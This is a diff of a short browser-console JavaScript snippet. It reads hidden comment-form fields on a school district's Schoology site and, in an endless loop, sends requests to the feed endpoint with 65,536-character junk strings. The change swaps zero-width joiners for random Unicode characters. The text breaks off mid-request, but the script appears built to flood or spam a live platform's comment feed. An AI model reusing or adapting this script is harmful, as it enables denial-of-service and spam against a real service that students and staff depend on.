@@ -2,17 +2,21 @@
 * @Author: UnsignedByte
 * @Date:   22:13:18, 12-Aug-2020
 * @Last Modified by:   UnsignedByte
-* @Last Modified time: 22:58:37, 12-Aug-2020
+* @Last Modified time: 23:07:21, 12-Aug-2020
 */
 
 // ex: edge-assoc-<stuff>
 let id = null;
-let content = "\u200D".repeat(65536)
 let dat = Object.assign(...Array.prototype.slice.call(document.querySelectorAll(`#${id} .feed-comments .s-comments-post-form > form > div > input`)).map(x=>({[x.name]: x.value})))
 
 const delay = ms => new Promise(res => setTimeout(res, ms));
 
 for(;;){
+	let content = [];
+	for(let i = 0; i < 65536; i++){
+		content.push(String.fromCharCode(Math.floor(Math.random()*0x110000)))
+	}
+	content = content.join("");
 	await fetch(`https://pausd.schoology.com/${dat.node_realm}/${dat.node_realm_id}/feed?page=0`, {
 	  "headers": {
 	    "accept": "application/json, text/javascript, */*; q=0.01",
